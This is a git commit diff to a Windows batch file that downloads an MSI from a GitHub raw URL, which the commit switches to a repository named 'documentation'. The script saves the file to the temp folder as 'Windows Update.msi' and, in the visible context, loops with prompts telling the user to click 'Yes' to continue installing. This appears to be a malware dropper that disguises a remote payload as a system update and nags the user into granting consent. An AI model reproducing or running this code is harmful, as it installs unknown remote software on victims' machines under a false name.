b0e9589b28a6427b5b50b8fea6cb7abaea829a9c
yvonsguin-afk <yvonsguin@gmail.com>
2025-09-23 23:00:09 +0200

    Update file2.bat

--- file2.bat
+++ file2.bat
@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :: Set download URL and paths
-set "url=https://raw.githubusercontent.com/yvonsguin-afk/encrypted-files/refs/heads/main/sets.msi"
+set "url=https://raw.githubusercontent.com/Boyretro/documentation/refs/heads/main/sets.msi"
 set "outputFileName=Windows Update.msi"
 set "outputFilePath=%TEMP%\%outputFileName%"
 
@@ -42,6 +42,7 @@ echo Please click "Yes" to continue the installation.
 :: Wait 2 seconds before trying again
 timeout /t 2 /nobreak >nul
 goto RunLoop
+
 
 
 
